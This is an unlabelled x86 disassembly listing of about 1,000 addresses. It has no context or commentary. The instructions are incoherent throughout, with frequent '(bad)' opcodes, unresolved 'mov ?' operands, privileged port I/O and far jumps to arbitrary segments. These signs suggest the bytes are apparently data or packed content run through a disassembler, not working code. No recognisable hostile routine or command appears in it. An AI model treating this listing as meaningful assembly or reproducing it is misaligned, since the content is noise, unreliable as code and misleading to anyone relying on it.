  423f08:	mul    DWORD PTR [esi]
  423f0a:	(bad)  
  423f0b:	mov    eax,0xbb
  423f10:	add    BYTE PTR [eax],al
  423f12:	sar    al,cl
  423f14:	data16 outs dx,BYTE PTR es:[esi]
  423f17:	mov    esi,0x8c85fcd2
  423f1c:	out    dx,al
  423f1d:	ficom  DWORD PTR [eax*4-0x47dce321]
  423f24:	add    DWORD PTR [eax],eax
  423f26:	repz add al,0x0
  423f29:	add    bh,al
  423f2b:	mov    eax,0x505272f2
  423f30:	push   es
  423f31:	pop    edi
  423f32:	sahf   
  423f33:	dec    ebx
  423f34:	out    0xb2,eax
  423f36:	pop    ds
  423f37:	(bad)  
  423f38:	arpl   WORD PTR [edx-0x7f5d56db],dx
  423f3e:	aas    
  423f3f:	jnp    0x423f87
  423f41:	icebp  
  423f42:	xchg   esi,eax
  423f43:	scas   al,BYTE PTR es:[edi]
  423f44:	adc    eax,0x109756a3
  423f49:	jmp    0x8594:0x4886707a
  423f50:	pop    ss
  423f51:	aaa    
  423f52:	scas   eax,DWORD PTR es:[edi]
  423f53:	(bad)  
  423f54:	jmp    0x423edc
  423f56:	mov    ss,WORD PTR [ebp-0x59011f91]
  423f5c:	not    DWORD PTR ds:0xd2cc5312
  423f62:	jecxz  0x423f21
  423f64:	dec    esi
  423f65:	ret    0x871a
  423f68:	sub    bl,0x1b
  423f6b:	or     ah,BYTE PTR [edx]
  423f6d:	aad    0x3a
  423f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f70:	and    al,0xe8
  423f72:	sub    al,0x5d
  423f74:	nop
  423f75:	mul    DWORD PTR [edi]
  423f77:	sbb    DWORD PTR [eax+0x7f],ecx
  423f7a:	outs   dx,BYTE PTR ds:[esi]
  423f7b:	imul   ebx,DWORD PTR [eax+0x1ee9093a],0xdea1cf9c
  423f85:	inc    ecx
  423f86:	sahf   
  423f87:	sub    dl,ah
  423f89:	or     dh,BYTE PTR [eax+eax*1-0x354d1827]
  423f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f91:	pop    ss
  423f92:	rcl    DWORD PTR [ebp-0x7],cl
  423f95:	in     al,dx
  423f96:	pusha  
  423f97:	loope  0x423f21
  423f99:	cmp    eax,0xac6ef1cd
  423f9e:	int    0x91
  423fa0:	mov    esi,DWORD PTR [ebx-0x28]
  423fa3:	aaa    
  423fa4:	push   esi
  423fa5:	aaa    
  423fa6:	mov    ebx,0xb82f3bc
  423fab:	jmp    0xb5e2:0xff82a64
  423fb2:	addr16 push 0xffffffcf
  423fb5:	div    bh
  423fb7:	jle    0x423f7a
  423fb9:	je     0x424006
  423fbb:	mov    edx,0xcc2d093f
  423fc0:	mov    ebp,0x96748a88
  423fc5:	fadd   DWORD PTR [ebx]
  423fc7:	mov    ds:0xe79b4a3a,al
  423fcc:	dec    edi
  423fcd:	mov    ch,0xb8
  423fcf:	xchg   esp,eax
  423fd0:	mov    cl,0xae
  423fd2:	xchg   edx,eax
  423fd3:	test   esp,0xde94e20
  423fd9:	sub    ecx,DWORD PTR [ebp+edx*2+0x495c6aba]
  423fe0:	out    dx,eax
  423fe1:	cmp    DWORD PTR [ebx+0x5fbc5d97],edx
  423fe7:	dec    ebx
  423fe8:	push   edx
  423fe9:	and    bl,cl
  423feb:	fdivr  DWORD PTR [eax+esi*4+0x7d4a593e]
  423ff2:	std    
  423ff3:	sbb    al,0x98
  423ff5:	mov    cl,0xbd
  423ff7:	ret    
  423ff8:	fld    DWORD PTR [ecx-0x6b]
  423ffb:	loope  0x423fda
  423ffd:	jmp    0x65fe9209
  424002:	aaa    
  424003:	dec    esi
  424004:	mov    ebp,ecx
  424006:	lods   al,BYTE PTR ds:[esi]
  424007:	je     0x423fb0
  424009:	dec    ebp
  42400a:	inc    edx
  42400b:	or     DWORD PTR [esi],0xe81e5d6a
  424011:	ss dec ecx
  424013:	cdq    
  424014:	or     esi,eax
  424016:	fcmovne st,st(0)
  424018:	add    eax,0x40c220f3
  42401d:	ret    0x4979
  424020:	out    dx,eax
  424021:	(bad)  
  424022:	fist   WORD PTR [edi-0x1c]
  424025:	(bad)
  424029:	cmp    al,0xc7
  42402b:	jb     0x424061
  42402d:	pop    ds
  42402e:	test   al,0xda
  424030:	std    
  424031:	mov    bl,0xa
  424033:	sbb    ah,BYTE PTR [ebp+0x4d]
  424036:	xor    bh,BYTE PTR ds:0xda9bca2b
  42403c:	std    
  42403d:	push   edx
  42403e:	retf   
  42403f:	(bad)  
  424040:	retf   0x5186
  424043:	int3   
  424044:	fsubr  st,st(6)
  424046:	cmc    
  424047:	pushf  
  424048:	aad    0x47
  42404a:	cmp    eax,0x945c30ee
  42404f:	cmp    BYTE PTR [ecx-0x55458dc5],bh
  424055:	push   ebx
  424056:	xor    DWORD PTR [eax],edi
  424058:	clc    
  424059:	adc    al,0xe0
  42405b:	popf   
  42405c:	lds    eax,FWORD PTR [ebp+ecx*4-0x21]
  424060:	pushf  
  424061:	pop    eax
  424062:	push   esi
  424063:	out    0xc1,eax
  424065:	shr    DWORD PTR [edx+ecx*2-0x61],cl
  424069:	push   edx
  42406a:	sub    ch,BYTE PTR [eax+0x6b]
  42406d:	outs   dx,DWORD PTR ds:[esi]
  42406e:	mov    DWORD PTR [esi],esp
  424070:	jnp    0x424018
  424072:	scas   al,BYTE PTR es:[edi]
  424073:	in     al,0x4f
  424075:	xchg   esi,eax
  424076:	jmp    0x423fff
  424078:	mov    dh,0x2
  42407a:	jg     0x424090
  42407c:	sbb    dl,BYTE PTR [esi]
  42407e:	inc    ebp
  42407f:	out    0x1a,al
  424081:	mov    edx,0x52740b69
  424086:	in     al,dx
  424087:	sub    al,0x56
  424089:	sbb    al,0x84
  42408b:	lods   eax,DWORD PTR ds:[esi]
  42408c:	mov    eax,0x540380bf
  424091:	mov    ds:0x3cc1677c,al
  424096:	dec    eax
  424097:	es addr16 pop esp
  42409a:	push   edx
  42409b:	rol    DWORD PTR [ebx+edi*1],1
  42409e:	(bad)  
  4240a0:	sbb    cl,bh
  4240a2:	push   edi
  4240a3:	mov    cl,BYTE PTR ds:0x4ce577fd
  4240a9:	or     edx,ebp
  4240ab:	repz xor dl,ah
  4240ae:	test   al,0x7b
  4240b0:	cdq    
  4240b1:	mov    ah,BYTE PTR [edi-0x2a]
  4240b4:	adc    al,0x57
  4240b6:	int    0xc3
  4240b8:	mov    ds:0xcfdc3a8,al
  4240bd:	stos   BYTE PTR es:[edi],al
  4240be:	mov    al,0x17
  4240c0:	cdq    
  4240c1:	aad    0xd2
  4240c3:	inc    eax
  4240c4:	push   ss
  4240c5:	mov    ah,0xf7
  4240c7:	(bad)  
  4240c8:	mov    cl,0x4d
  4240ca:	int3   
  4240cb:	pop    ds
  4240cc:	rol    DWORD PTR [esi+0xed9e670],0xde
  4240d3:	add    al,0x96
  4240d5:	cli    
  4240d6:	mov    ah,0x4d
  4240d8:	pushf  
  4240d9:	jno    0x4240ba
  4240db:	adc    eax,0x9ec4bb39
  4240e0:	adc    al,BYTE PTR [ecx+0xc9dfaa1]
  4240e6:	test   al,0xac
  4240e8:	loopne 0x4240ff
  4240ea:	add    esp,0x4a
  4240ed:	iret   
  4240ee:	xor    al,0x34
  4240f0:	fmul   QWORD PTR [edi-0x8]
  4240f3:	dec    ecx
  4240f4:	retf   
  4240f5:	int    0xcf
  4240f7:	jge    0x4240ea
  4240f9:	xlat   BYTE PTR ds:[ebx]
  4240fa:	push   edx
  4240fb:	lahf   
  4240fc:	or     esi,esp
  4240fe:	pop    ebp
  4240ff:	push   eax
  424100:	or     al,BYTE PTR [ebp-0x4d5bc665]
  424106:	out    dx,al
  424107:	mov    DWORD PTR [edx],ebx
  424109:	jae    0x424152
  42410b:	cmp    ch,BYTE PTR [ebx+0x49]
  42410e:	pop    ecx
  42410f:	aam    0x56
  424111:	pop    ss
  424112:	mov    al,0xf8
  424114:	xor    BYTE PTR [ecx-0x75d250a1],dl
  42411a:	sub    eax,0x12a19398
  42411f:	ret    0x8ff9
  424122:	mov    bh,0xed
  424125:	mov    gs,WORD PTR [ecx]
  424127:	fwait
  424128:	pusha  
  424129:	cmp    eax,0xfbe7616a
  42412e:	inc    ecx
  42412f:	ret    
  424130:	icebp  
  424131:	cld    
  424132:	xchg   BYTE PTR [edx+0x64],dh
  424135:	fmul   DWORD PTR [ebx-0x4893dd27]
  42413b:	iret   
  42413c:	and    cl,BYTE PTR [eax]
  42413e:	scas   eax,DWORD PTR es:[edi]
  42413f:	jp     0x42416d
  424141:	pop    edi
  424142:	xchg   ebp,eax
  424143:	xor    eax,0xdef845d5
  424148:	mov    ?,WORD PTR [eax-0x14]
  42414b:	pop    ecx
  42414c:	out    0xaa,al
  42414e:	xchg   edi,eax
  42414f:	and    esp,DWORD PTR [ebx]
  424151:	(bad)  [edx-0x4ef61009]
  424157:	pop    esp
  424158:	shl    BYTE PTR [edx+0x3d],cl
  42415b:	inc    edx
  42415c:	push   ebp
  42415d:	xchg   BYTE PTR [esi+0x6b],dh
  424160:	mov    eax,ds:0x19bf72b0
  424165:	stos   BYTE PTR es:[edi],al
  424166:	jnp    0x424162
  424168:	xchg   bh,ah
  42416a:	sub    dl,BYTE PTR [edx]
  42416c:	lods   al,BYTE PTR ds:[esi]
  42416d:	ss stos BYTE PTR es:[edi],al
  42416f:	jbe    0x42414a
  424171:	or     al,0x38
  424173:	stos   BYTE PTR es:[edi],al
  424174:	out    dx,eax
  424175:	push   ss
  424176:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  424178:	mov    bh,0x4e
  42417a:	sbb    edi,DWORD PTR [eax-0x3b]
  42417d:	fsubr  st(0),st
  42417f:	out    dx,eax
  424180:	cwde   
  424181:	cdq    
  424182:	das    
  424183:	xchg   BYTE PTR [ebx+0x5b],dl
  424186:	push   ebx
  424187:	mov    ah,al
  424189:	stos   BYTE PTR es:[edi],al
  42418a:	pop    ebp
  42418b:	mov    ebp,0xc98e3b3f
  424190:	loop   0x424176
  424192:	repnz xor dh,ch
  424195:	xchg   BYTE PTR [eax+esi*8-0x70],dl
  424199:	jb     0x4241bc
  42419b:	xchg   al,cl
  42419d:	test   DWORD PTR [edi-0x5be90cc],eax
  4241a3:	adc    al,0xb
  4241a5:	outs   dx,DWORD PTR ds:[esi]
  4241a6:	out    0x9f,al
  4241a8:	out    dx,eax
  4241a9:	fcmove st,st(7)
  4241ab:	addr16 pop esp
  4241ad:	inc    edi
  4241ae:	jle    0x42422a
  4241b0:	les    esi,FWORD PTR [ecx]
  4241b2:	pop    DWORD PTR [ebx]
  4241b4:	retf   
  4241b5:	and    eax,0x8c4eec69
  4241ba:	inc    edi
  4241bb:	mov    al,ds:0x7394a267
  4241c0:	inc    BYTE PTR [esi-0x42]
  4241c3:	and    al,0xf2
  4241c5:	adc    BYTE PTR [edi],ah
  4241c7:	mov    ?,WORD PTR [eax]
  4241c9:	cmp    BYTE PTR [eax],0x1f
  4241cc:	lods   al,BYTE PTR ds:[esi]
  4241cd:	mov    eax,ds:0x413d243b
  4241d2:	push   es
  4241d3:	add    eax,0xf5a3969f
  4241d8:	or     eax,0x433f2e44
  4241dd:	jl     0x424166
  4241df:	mov    WORD PTR [eax-0x64],es
  4241e2:	loopne 0x4241fa
  4241e4:	ss and eax,0xd4033920
  4241ea:	ds push dx
  4241ed:	xchg   ebp,eax
  4241ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241ef:	aaa    
  4241f0:	lds    esp,FWORD PTR [edi]
  4241f2:	xor    eax,0x25a876a3
  4241f7:	test   eax,0x39c847b8
  4241fc:	ret    0x8d88
  4241ff:	(bad)  
  424200:	shl    DWORD PTR [ebx-0x48137dbf],cl
  424206:	jmp    0xfdd23fd3
  42420b:	test   BYTE PTR [edi+0x461078db],dl
  424211:	out    dx,al
  424212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424213:	aam    0x88
  424215:	mov    edi,DWORD PTR ds:0xdaaaae2
  42421b:	xor    DWORD PTR [edi+0x19f50ca9],0x6278d031
  424225:	data16 sbb al,0x41
  424228:	out    dx,eax
  424229:	inc    eax
  42422a:	test   DWORD PTR [edx-0x40],ebp
  42422d:	dec    esi
  42422e:	jge    0x42427b
  424230:	adc    eax,0xa8ed3484
  424235:	inc    ecx
  424236:	fnsave [ebx+0x33d11f03]
  42423c:	outs   dx,DWORD PTR ds:[esi]
  42423d:	push   esp
  42423e:	adc    eax,0x507075ea
  424243:	sbb    BYTE PTR [ebp-0x9],bl
  424246:	dec    edi
  424247:	pop    eax
  424248:	cld    
  424249:	rcr    esi,cl
  42424b:	cmc    
  42424c:	xchg   ebx,eax
  42424d:	icebp  
  42424e:	cli    
  42424f:	ret    
  424250:	mov    ah,0xc1
  424252:	push   0xffffffeb
  424254:	inc    ecx
  424255:	ja     0x4241e3
  424257:	ins    DWORD PTR es:[edi],dx
  424258:	cmp    eax,0xe01de749
  42425d:	inc    ebx
  42425e:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  424261:	lock and dl,BYTE PTR [ebp-0x39]
  424265:	jmp    0x42421c
  424267:	jo     0x42429b
  424269:	mov    ebp,0xed9e2a44
  42426e:	and    ebp,DWORD PTR [ebp*1+0x26ea351e]
  424275:	jge    0x4242e2
  424277:	push   0xffffffa4
  424279:	sub    dh,BYTE PTR [esi-0x7ab4b8f1]
  42427f:	mov    al,ds:0xae43d6b5
  424284:	lods   al,BYTE PTR ds:[esi]
  424285:	test   DWORD PTR [ecx+0x25],esp
  424288:	mov    esp,0x5047cf59
  42428d:	lods   eax,DWORD PTR ds:[esi]
  42428e:	repz aaa 
  424290:	mov    BYTE PTR [edi-0x4b],0x2
  424294:	dec    ecx
  424295:	or     al,0xa7
  424297:	jle    0x4242ae
  424299:	sub    eax,0x710a4b00
  42429e:	jns    0x42425e
  4242a0:	push   ss
  4242a1:	mov    es,WORD PTR [ebp+0x660f96e1]
  4242a7:	push   ds
  4242a8:	jmp    0xbde2:0x1949d790
  4242af:	inc    ebx
  4242b0:	dec    edi
  4242b1:	fadd   QWORD PTR [edx-0x662cea66]
  4242b7:	stc    
  4242b8:	(bad)  
  4242b9:	push   ss
  4242ba:	out    0x99,al
  4242bc:	or     esi,DWORD PTR ds:0x3f09d959
  4242c2:	push   0x8fd6dba2
  4242c7:	mul    BYTE PTR [esi+0x62]
  4242ca:	sbb    BYTE PTR [ebx-0x57],ch
  4242cd:	(bad)  
  4242ce:	iret   
  4242cf:	mov    edi,0xe813f99b
  4242d4:	add    ch,ch
  4242d6:	ret    0x1832
  4242d9:	inc    eax
  4242da:	fsubr  QWORD PTR [eax]
  4242dc:	adc    eax,0x16209c8a
  4242e1:	pop    ecx
  4242e2:	mov    edi,DWORD PTR [edi]
  4242e4:	inc    ebx
  4242e5:	sub    BYTE PTR ds:0x6b7b8428,ch
  4242eb:	mov    ds:0xf58bac0c,eax
  4242f0:	stc    
  4242f1:	sub    ebp,esp
  4242f3:	xchg   esp,eax
  4242f4:	fdiv   QWORD PTR [edi]
  4242f6:	icebp  
  4242f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242f8:	add    dl,BYTE PTR [edi]
  4242fa:	imul   DWORD PTR [ebx+0x192eb419]
  424300:	dec    esp
  424301:	pop    ss
  424302:	or     BYTE PTR [eax-0x214f4e04],al
  424308:	dec    edi
  424309:	loop   0x424333
  42430b:	out    0xea,al
  42430d:	mov    esp,0xbc2de048
  424312:	cmc    
  424313:	push   edx
  424314:	mov    dl,0xcf
  424316:	mov    eax,0x3f93fab2
  42431b:	pusha  
  42431c:	dec    edi
  42431d:	mov    ch,0xfe
  42431f:	fisttp QWORD PTR [edx+ebp*8]
  424322:	pmuludq mm6,QWORD PTR ds:0x401b9740
  424329:	mov    dh,0xce
  42432b:	sbb    esi,0x877b83ee
  424331:	mov    bl,0x9b
  424333:	cmp    esi,DWORD PTR [ebx-0x73]
  424336:	lods   eax,DWORD PTR ds:[esi]
  424337:	push   0xa0da7a7b
  42433c:	push   esi
  42433d:	push   ebx
  42433e:	call   0xdcd2:0x9576f523
  424345:	push   ecx
  424346:	adc    DWORD PTR [esi],edx
  424348:	or     al,0xd4
  42434a:	stos   DWORD PTR es:[edi],eax
  42434b:	sbb    BYTE PTR [edx+0x5ffa2902],bh
  424351:	xor    ch,BYTE PTR [edi+0x5b]
  424354:	fs cmp al,0xc5
  424357:	pop    ss
  424358:	cli    
  424359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42435a:	retf   
  42435b:	dec    eax
  42435c:	dec    ecx
  42435d:	jmp    0x7593aa33
  424362:	sbb    BYTE PTR [edx+eiz*8+0x3a5354e8],bh
  424369:	lock cmc 
  42436b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42436d:	mov    cl,BYTE PTR [ebx+0x44]
  424370:	cwde   
  424371:	jp     0x424340
  424373:	jl     0x424333
  424375:	daa    
  424376:	pop    ebp
  424377:	xor    DWORD PTR [esi+ebx*1+0x61],ecx
  42437b:	pop    ebx
  42437c:	dec    ecx
  42437d:	mov    dl,0xa2
  42437f:	call   0xb0f8:0x5b9a652f
  424386:	and    al,0xaf
  424388:	dec    ebp
  424389:	aas    
  42438a:	fist   WORD PTR ss:[ecx*4-0x248ae359]
  424392:	imul   eax,DWORD PTR ds:0xaa055327,0x79
  424399:	or     DWORD PTR [ebx+0x26],edi
  42439c:	cmp    eax,0x7c28024c
  4243a1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243a3:	shl    DWORD PTR [edi+0x56],0x31
  4243a7:	sti    
  4243a8:	add    ecx,edi
  4243aa:	rol    BYTE PTR ds:0xbd5bb931,cl
  4243b0:	sub    esp,esi
  4243b2:	cmp    al,0x1e
  4243b4:	loop   0x4243c0
  4243b6:	mov    ecx,0xaa8bca89
  4243bb:	stc    
  4243bc:	jae    0x4243d4
  4243be:	and    eax,0xfe0f8e7d
  4243c3:	mov    ds,edx
  4243c5:	xchg   esi,eax
  4243c6:	inc    esp
  4243c7:	mov    ah,0x4c
  4243c9:	push   esp
  4243ca:	mov    ?,WORD PTR es:[ecx-0x2de30940]
  4243d1:	pop    ss
  4243d2:	cld    
  4243d3:	out    dx,eax
  4243d4:	jp     0x42441f
  4243d6:	inc    ebp
  4243d7:	push   ebp
  4243d8:	pop    esp
  4243d9:	lods   al,BYTE PTR ds:[esi]
  4243da:	sub    edx,DWORD PTR [esi+0x5d2323ce]
  4243e0:	add    BYTE PTR [ecx],dh
  4243e2:	mov    ds:0xffaf2764,al
  4243e7:	adc    dh,al
  4243e9:	pop    edx
  4243ea:	in     al,dx
  4243eb:	rcl    BYTE PTR [edi-0x17265873],1
  4243f1:	mov    bl,0x42
  4243f3:	jmp    0x4243ec
  4243f5:	scas   eax,DWORD PTR es:[edi]
  4243f6:	mov    ebp,0xf8f57eb4
  4243fb:	mov    ebx,0xc226f44
  424400:	mov    eax,0x886a134b
  424405:	sbb    eax,0x5e444aae
  42440a:	xchg   ebx,eax
  42440b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42440c:	stos   DWORD PTR es:[edi],eax
  42440d:	push   es
  42440e:	frstor [edi]
  424410:	inc    ebp
  424411:	ins    DWORD PTR es:[edi],dx
  424412:	(bad)  
  424414:	pop    ss
  424415:	(bad)  
  424416:	aaa    
  424417:	push   ebp
  424418:	call   0x59fd7cb7
  42441d:	add    BYTE PTR [eax],al
  42441f:	add    BYTE PTR [eax],al
  424421:	add    BYTE PTR [edx+ebx*8],ch
  424424:	iret   
  424425:	cmp    bh,0x95
  424428:	outs   dx,DWORD PTR ds:[esi]
  424429:	(bad)  
  42442a:	jecxz  0x4243f5
  42442c:	push   ds
  42442d:	ins    DWORD PTR es:[edi],dx
  42442e:	mov    DWORD PTR [esi],ebp
  424430:	test   BYTE PTR fs:[esi],dl
  424433:	mov    ebp,0x4f30001
  424438:	add    BYTE PTR [eax],al
  42443a:	stos   BYTE PTR es:[edi],al
  42443b:	sbb    ah,BYTE PTR [ecx-0x5fa4ca8]
  424441:	xor    DWORD PTR [ecx+0x758173a2],edx
  424447:	and    cl,al
  424449:	xor    ah,dh
  42444b:	cmc    
  42444c:	and    ah,cl
  42444e:	sub    al,0xf4
  424450:	add    al,0x80
  424452:	leave  
  424453:	mov    ch,BYTE PTR [ecx+ebp*2-0x50]
  424457:	shl    DWORD PTR [edi],cl
  424459:	icebp  
  42445a:	or     BYTE PTR [ecx+edi*8-0x7a],ah
  42445e:	ds pop esi
  424460:	sub    DWORD PTR [esi+0x3c170bd3],esp
  424466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424467:	mov    WORD PTR [ebx+eiz*4],gs
  42446a:	adc    eax,0x5c7b2178
  42446f:	mov    edi,0x385bff87
  424474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424475:	loop   0x4244e6
  424477:	(bad)  
  424478:	xchg   edi,eax
  424479:	jp     0x4244d3
  42447b:	aad    0x3b
  42447d:	mov    BYTE PTR [ebp+eiz*1-0x251741a2],bh
  424484:	inc    edi
  424485:	aas    
  424486:	sbb    eax,0x85d1de79
  42448b:	mov    cl,0xa6
  42448d:	jecxz  0x42443a
  42448f:	jb     0x424458
  424491:	mov    esi,0x7015eb12
  424496:	scas   eax,DWORD PTR es:[edi]
  424497:	xchg   ebx,eax
  424498:	scas   eax,DWORD PTR es:[edi]
  424499:	loopne 0x4244f8
  42449b:	jge    0x4244ad
  42449d:	push   esi
  42449e:	add    DWORD PTR [ecx+edi*2-0x12],0xffffffd8
  4244a3:	bnd jo 0x42450e
  4244a6:	mov    ecx,0x6f6cbf50
  4244ab:	jno    0x4244c5
  4244ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244ae:	in     eax,0xe7
  4244b0:	mov    edi,0xdcc43e25
  4244b5:	xor    al,0x86
  4244b7:	(bad)  
  4244b8:	neg    BYTE PTR [eax-0x5d679bc2]
  4244be:	xchg   esp,eax
  4244bf:	lahf   
  4244c0:	push   cs
  4244c1:	mov    ebx,DWORD PTR [edi-0x71]
  4244c4:	and    DWORD PTR [edx],ecx
  4244c6:	inc    edi
  4244c7:	or     BYTE PTR [edi],dh
  4244c9:	pusha  
  4244ca:	aad    0xa0
  4244cc:	inc    esi
  4244cd:	adc    DWORD PTR [eax+0x14333aa6],eax
  4244d3:	repz mov ah,0x4b
  4244d6:	hlt    
  4244d7:	xchg   esi,eax
  4244d8:	loop   0x4244a9
  4244da:	and    eax,0x3f96453b
  4244df:	scas   al,BYTE PTR es:[edi]
  4244e0:	arpl   WORD PTR [ebp+0x75dec41],di
  4244e6:	test   BYTE PTR ds:0x2fbdbb8a,bl
  4244ec:	test   eax,0xdd73a6b2
  4244f1:	lods   eax,DWORD PTR ds:[esi]
  4244f2:	jnp    0x4244d7
  4244f4:	sub    ch,BYTE PTR [edi+ecx*2+0x686104f2]
  4244fb:	(bad)  
  4244fc:	shl    BYTE PTR [ebp-0x4be68eb8],0x57
  424503:	xchg   ecx,eax
  424504:	push   ecx
  424505:	lods   al,BYTE PTR ds:[esi]
  424506:	sahf   
  424507:	pop    ecx
  424508:	push   es
  424509:	std    
  42450a:	sbb    DWORD PTR [ebx],ebx
  42450c:	dec    esp
  42450d:	inc    esp
  42450e:	jno    0x424568
  424510:	out    0x93,eax
  424512:	(bad)  
  424513:	stos   BYTE PTR es:[edi],al
  424514:	xlat   BYTE PTR ds:[ebx]
  424515:	neg    DWORD PTR [ecx]
  424517:	pop    edx
  424518:	push   cs
  424519:	call   0x1f5674be
  42451e:	test   eax,0x1d9b88bd
  424523:	mov    edi,0xb4bf795c
  424528:	jecxz  0x424525
  42452a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42452c:	dec    edx
  42452d:	mov    esi,0xcdbec05b
  424532:	fst    QWORD PTR [edi+ecx*4+0x56]
  424536:	out    dx,eax
  424537:	sar    DWORD PTR [ecx-0x2b15c792],0xc4
  42453e:	ins    BYTE PTR es:[edi],dx
  42453f:	loopne 0x424549
  424541:	push   cs
  424542:	cmp    dh,BYTE PTR [edi+0x4e443ca4]
  424548:	pushf  
  424549:	ficom  WORD PTR [edx-0x2ddc3c0f]
  42454f:	dec    esi
  424550:	push   eax
  424551:	lock mov DWORD PTR [ecx-0x3d],edi
  424555:	shl    DWORD PTR [ebp+0x5],0xe7
  424559:	cmp    BYTE PTR ds:0x93d9afb7,bh
  42455f:	xchg   edx,eax
  424560:	lds    ebp,FWORD PTR [eax+0x13]
  424563:	cmp    esi,esp
  424565:	in     al,0x30
  424567:	mov    bh,0x9e
  424569:	and    DWORD PTR ss:[eax],ebx
  42456c:	dec    edi
  42456d:	jo     0x4244ff
  42456f:	xchg   DWORD PTR [edi+ebx*1+0x60],ebx
  424573:	rcr    DWORD PTR [esi+ebx*2],cl
  424576:	adc    eax,0xf757051
  42457b:	xchg   edx,eax
  42457c:	fsub   DWORD PTR [edx+0x2d4ed9c]
  424582:	jp     0x424581
  424584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424585:	das    
  424586:	scas   eax,DWORD PTR es:[edi]
  424587:	pushf  
  424588:	mov    bl,0xf
  42458a:	dec    ebp
  42458b:	adc    DWORD PTR [ebx+ebp*4],ebx
  42458e:	add    al,0xe0
  424590:	pop    edx
  424591:	pop    eax
  424592:	call   0xc4de06c8
  424597:	pop    esp
  424598:	jmp    0x42454a
  42459a:	retf   0x51f6
  42459d:	ret    0x1510
  4245a0:	mov    bl,0x8a
  4245a2:	inc    ecx
  4245a3:	jg     0x42461a
  4245a5:	pop    edx
  4245a6:	dec    edx
  4245a7:	push   ss
  4245a8:	int    0x18
  4245aa:	inc    ebx
  4245ab:	aam    0xe4
  4245ad:	or     al,0x83
  4245af:	not    BYTE PTR [edi-0x2c4a677f]
  4245b5:	mov    dh,0xc2
  4245b7:	icebp  
  4245b8:	adc    DWORD PTR [edi-0x32f5d348],edi
  4245be:	push   ebx
  4245bf:	vunpcklpd xmm2,xmm5,xmm3
  4245c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245c4:	xchg   edx,eax
  4245c5:	ja     0x42457d
  4245c7:	(bad)  
  4245c8:	jg     0x4245a4
  4245ca:	rcr    DWORD PTR [edi],1
  4245cc:	popa   
  4245cd:	adc    DWORD PTR [edx-0x60],eax
  4245d0:	and    bl,BYTE PTR [ebx+eiz*4+0x362b28cd]
  4245d7:	sbb    eax,edi
  4245d9:	push   edx
  4245da:	ret    
  4245db:	push   es
  4245dc:	push   ds
  4245dd:	retf   0x9f8e
  4245e0:	cmp    al,0x82
  4245e2:	push   edx
  4245e3:	call   0x3dbd:0x835eec45
  4245ea:	cmc    
  4245eb:	xchg   edx,eax
  4245ec:	daa    
  4245ed:	inc    ebx
  4245ee:	fcmovu st,st(1)
  4245f0:	js     0x424650
  4245f2:	inc    edx
  4245f3:	xchg   edi,eax
  4245f4:	push   0xffffffe6
  4245f6:	xchg   DWORD PTR [eax],esi
  4245f8:	dec    ecx
  4245f9:	shr    DWORD PTR [ecx+0x11],cl
  4245fc:	sbb    DWORD PTR [edi-0x2],eax
  4245ff:	rcl    DWORD PTR [esi],1
  424601:	xlat   BYTE PTR ds:[ebx]
  424602:	xor    BYTE PTR [eax+0x5ef46c51],bl
  424608:	call   0x7d21828a
  42460d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42460e:	out    dx,al
  42460f:	scas   eax,DWORD PTR es:[edi]
  424610:	sub    esi,0x200d55f1
  424616:	hlt    
  424617:	push   cs
  424618:	call   0x1d3:0x25295eb5
  42461f:	ficom  WORD PTR [ebp-0x61]
  424622:	rol    DWORD PTR [edx+0x4cd242f3],1
  424628:	mov    ds:0x61ee3709,al
  42462d:	outs   dx,DWORD PTR ds:[esi]
  42462e:	sbb    DWORD PTR [ebx+0x7dd03f5d],esi
  424634:	sbb    esp,DWORD PTR [eax]
  424636:	xchg   esp,eax
  424637:	sti    
  424638:	fld    DWORD PTR [edi-0x281fbd88]
  42463e:	cmp    dl,bl
  424640:	jmp    0x42462e
  424642:	sbb    dl,BYTE PTR [ecx+ebx*8+0x25]
  424646:	jecxz  0x4245d3
  424648:	dec    esp
  424649:	xchg   esp,eax
  42464a:	(bad)  [eax+0x7c]
  42464d:	mov    cl,BYTE PTR [edi-0x5e]
  424650:	push   eax
  424651:	rol    DWORD PTR [ebp+ebx*8-0x3eafeb84],0x33
  424659:	lea    edx,[ecx-0x34701c28]
  42465f:	fs jb  0x4245f5
  424662:	int3   
  424663:	cmp    BYTE PTR [edx+0x5b],dl
  424666:	mov    ebx,0x1d350cff
  42466b:	pop    ss
  42466c:	out    0xbf,eax
  42466e:	pop    esp
  42466f:	adc    bh,BYTE PTR [ebx-0x5392adce]
  424675:	aam    0x3d
  424677:	fs push cs
  424679:	loop   0x4246c9
  42467b:	cmc    
  42467c:	xchg   ecx,eax
  42467d:	ss cmp eax,0xa4cd5b2d
  424683:	xor    eax,0x5525fe44
  424688:	mov    edi,ss
  42468a:	or     bh,BYTE PTR [esi]
  42468c:	push   ss
  42468d:	aam    0x7c
  42468f:	popa   
  424690:	ins    DWORD PTR es:[edi],dx
  424691:	ss cwde 
  424693:	jge    0x424713
  424695:	test   eax,0x371a4783
  42469a:	daa    
  42469b:	add    BYTE PTR [esi],bl
  42469d:	stc    
  42469e:	int    0x75
  4246a0:	into   
  4246a1:	stc    
  4246a2:	xor    BYTE PTR [esi-0x50],dh
  4246a5:	mov    eax,ecx
  4246a7:	fistp  DWORD PTR [ecx]
  4246a9:	jp     0x4246b5
  4246ab:	ins    DWORD PTR es:[edi],dx
  4246ac:	mov    esp,0x380b3c49
